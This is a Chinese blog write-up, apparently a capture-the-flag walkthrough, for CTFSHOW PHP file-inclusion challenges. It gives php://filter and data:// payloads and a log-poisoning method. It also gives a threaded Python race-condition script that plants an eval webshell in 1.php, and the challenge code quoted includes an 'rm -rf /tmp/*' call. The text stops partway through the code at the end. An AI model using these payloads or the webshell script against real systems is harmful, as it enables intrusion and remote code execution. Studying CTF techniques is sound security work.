@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>CTFSHOW-文件包含 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="CTFSHOW-文件包含 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/02/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T10:14:56.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/In-Challenge/">In Challenge</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">CTFSHOW-文件包含</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="—————————–起—————–"><a href="#—————————–起—————–" class="headerlink" title="—————————–起—————–"></a>—————————–起—————–</h1><h3 id="Web78（filter读文件）"><a href="#Web78（filter读文件）" class="headerlink" title="Web78（filter读文件）"></a>Web78（filter读文件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>无感情直接payload：?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<h3 id="Web79（data加密执行命令）"><a href="#Web79（data加密执行命令）" class="headerlink" title="Web79（data加密执行命令）"></a>Web79（data加密执行命令）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);	</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题用data伪协议执行命令，无内鬼直接payload：</p>
+<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</p>
+<h3 id="Web80（包含日志）"><a href="#Web80（包含日志）" class="headerlink" title="Web80（包含日志）"></a>Web80（包含日志）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题不能用data也不能用filter伪协议，这道题要用<strong>包含日志文件</strong></p>
+<p>日志文件存一般存放在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>所以这道题的payload如下:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663472912851-96cd9919-d01a-458f-96d4-e00e3d420ac7.png#averageHue=%23f6f5f5&clientId=u0db16e80-5f06-4&from=paste&height=293&id=u5edec6f5&name=image.png&originHeight=366&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&size=178960&status=done&style=none&taskId=uff4cf2ba-2ce4-4c41-9e9f-4e34172cc77&title=&width=951.2" alt="image.png"><br>这里输入指令ls发现有fl0g.php文件，所以我们直接读取即可<br>得出答案</p>
+<h3 id="Web81（同上）"><a href="#Web81（同上）" class="headerlink" title="Web81（同上）"></a>Web81（同上）</h3><p>payload同上</p>
+<h3 id="Web82（条件竞争）"><a href="#Web82（条件竞争）" class="headerlink" title="Web82（条件竞争）"></a>Web82（条件竞争）</h3><p>这边ban掉了.,已经不能用上面任何一种方法了，php里面我们能控制的无后缀文件只有唯一一个，那就是seesion文件，然后session文件的名字我们是可以控制的，如果我们传入PHPSESSID&#x3D;aaa，那么session文件就是session_aaa，然后还要介绍一下</p>
+<p>PHP_SESSION_UPLOAD_PROGRESS:是用来检测文件上传进度的，post一个名称为这个的参数，这个参数会写入session文件中</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>首先利用一个小脚本去给这个靶场上传一个文件，然后进行抓包，</p>
+<p>脚本：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://6e62b0ec-d001-4b09-a568-d105c92e3da6.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662323748435-3b068d4f-69db-4292-9772-005ebfd8d354.png#averageHue=%23f8f7f7&id=bZuoI&originHeight=601&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>可以看到已经有PHP_SESSION_UPLOAD_PROGRESS的值，我们把他的值改为我们要执行的代码，如</p>
+<p>再加入一个<strong>COOKIE:PHPSESSID&#x3D;flag</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662324098581-59d2c25b-d686-4a2a-9081-2dbf5cbfb46e.png#averageHue=%23f6f6f5&id=LLnJ8&originHeight=511&originWidth=682&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>然后我们再抓一个get类型的包，就是在靶场get传入一个file&#x3D;1：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662323933750-6b2385b5-43cc-49d9-a3ff-6cc5e41944e9.png#averageHue=%23f8f7f7&id=Y7bFx&originHeight=444&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>然后把file改成file&#x3D;&#x2F;tmp&#x2F;sess_flag,然后POST和GET同时进行爆破，这边我选了10线程</p>
+<p>ps：这边爆破就是随便找个没用的内容，然后往里面爆破字典达到多次跑代码的效果</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662324213164-681c4e93-d91b-40ee-bd2b-67fc17c7655f.png#averageHue=%23f5f5f4&id=cALnC&originHeight=270&originWidth=489&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662324345493-fa4264d4-f827-4763-9e04-da135bbbb285.png#averageHue=%23f8f8f8&id=KyWSQ&originHeight=282&originWidth=699&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>结果：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662324675635-acc6741b-33ab-45b3-9f9f-5e4e54479e50.png#averageHue=%23f8f6f4&id=jMAlC&originHeight=581&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">诺，可以看到已经出来答案了，fl0g.php和index.php就是当前目录的文件</p>
+<h5 id="分析一下"><a href="#分析一下" class="headerlink" title="分析一下"></a>分析一下</h5><p>我们来看看回显这一段代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_fl0g.php</span><br><span class="line">index.php</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1662324411;s:14:&quot;content_length&quot;;i:455;s:15:&quot;bytes_processed&quot;;i:455;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:5:&quot;1.php&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1662324411;s:15:&quot;bytes_processed&quot;;i:455;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到没，这边就是序列化后的内容，和我们上面说的一样，会给$_SESSION数组带来一个由session.upload_progress.prefix+session.upload_progress.name组成的键名</p>
+<ul>
+<li>这边session.upload_progress.prefix&#x3D;’upload_progress_’</li>
+<li>session.upload_progress.name&#x3D;fl0g.phpindex.php|a:5{s:10:”start_time”;i:1662324411;s:14:”content_length”;i:455;s:15:”bytes_processed”;i:455;s:4:”done”;b:0;s:5:”files”;a:1:{i:0;a:7:{s:10:”field_name”;s:4:”file”;s:4:”name”;s:5:”1.php”;s:8:”tmp_name”;N;s:5:”error”;i:0;s:4:”done”;b:0;s:10:”start_time”;i:1662324411;s:15:”bytes_processed”;i:455;}}}</li>
+</ul>
+<p>这边为什么session.upload_progress.name不是system(‘ls’)呢，这是因为system(‘ls’)被执行了，所以它的回显替代了它</p>
+<h5 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h5><p>用同样的方法，我们把system(‘ls’)改为system(tac fl0g.php)，读取flag文件：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662325052779-0016903c-2066-44cf-b08c-71bdb16c8539.png#averageHue=%23f8f6f4&id=fx6Bj&originHeight=632&originWidth=1224&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 592</span><br><span class="line"></span><br><span class="line">upload_progress_$flag=&quot;ctfshow&#123;672ea89e-e1b9-40ea-84ff-81babe9d7346&#125;&quot;;</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @Last Modified time: 2020-09-16 11:25:00</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Date:   2020-09-16 11:24:37</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">|a:5:&#123;s:10:&quot;start_time&quot;;i:1662325033;s:14:&quot;content_length&quot;;i:462;s:15:&quot;bytes_processed&quot;;i:462;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:5:&quot;1.php&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1662325033;s:15:&quot;bytes_processe</span></span><br></pre></td></tr></table></figure>
+
+<p>还是完全符合上述规则的！</p>
+<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>这边我们原理还是一样的，只不过是用python脚本去跑一下了，都有注释：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url=<span class="string">&#x27;http://6e62b0ec-d001-4b09-a568-d105c92e3da6.challenge.ctf.show/&#x27;</span> <span class="comment">#引入url</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span> <span class="comment">#PHPSESSID的值</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span> <span class="comment">#将木马写入1.php</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment">#上传一个50k的文件</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=requests.post(url,data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span> <span class="comment">#将这段代码写入session文件中</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid <span class="comment">#同上，PHPSESSID的值</span></span><br><span class="line">        &#125;,</span><br><span class="line">         files=&#123;</span><br><span class="line">             <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes) <span class="comment">#上传这个文件单单只是为了抓个包，其他一点用都没有,可以删除</span></span><br><span class="line">         &#125;</span><br><span class="line">         )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid      <span class="comment">#包含session文件让第一个eval执行，然后执行第二个eval</span></span><br><span class="line">        &#125;)</span><br><span class="line">        response2=session.get(url+<span class="string">&#x27;1.php&#x27;</span>) <span class="comment">#获得回显</span></span><br><span class="line">        <span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++perfect+++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        evnet=threading.Event()       <span class="comment">#开启线程</span></span><br><span class="line">        <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:        <span class="comment">#多线程操作</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">        evnet.<span class="built_in">set</span>()           <span class="comment">#将信号标志设置为True，并唤醒所有处于等待状态的线程。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662325279337-9fa25dc2-e532-46be-a55d-97f347e65e2b.png#averageHue=%23615646&id=cFUWz&originHeight=627&originWidth=1047&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">出现perfect值的时候就说明已经将内容写入了1.php，这时候直接访问1.php,进行远程rce，这边rce的时候，py脚本一定要保持运行，进行条件竞争：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662325358069-dd3e2192-1cc8-4a41-ae24-d565b57cabf9.png#averageHue=%239f9f9f&id=dD8Yy&originHeight=941&originWidth=1895&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>得到结果</p>
+<h5 id="浅分析"><a href="#浅分析" class="headerlink" title="浅分析"></a>浅分析</h5><p>这里利用的思路是在session文件中写入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再POST传递参数1:&#x3D;file_put_contents(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’,’’);</p>
+<p>将<code>&lt;?php eval($_POST[2]);?&gt;</code>写入1.php中</p>
+<p>最后访问1.php去进行远程RCE，密码就是2</p>
+<p>这就是整体的思路</p>
+<h3 id="Web83（条件竞争）"><a href="#Web83（条件竞争）" class="headerlink" title="Web83（条件竞争）"></a>Web83（条件竞争）</h3><p>和上一题一样，跑脚本，等perfect</p>
+<h3 id="Web84（条件竞争）"><a href="#Web84（条件竞争）" class="headerlink" title="Web84（条件竞争）"></a>Web84（条件竞争）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span 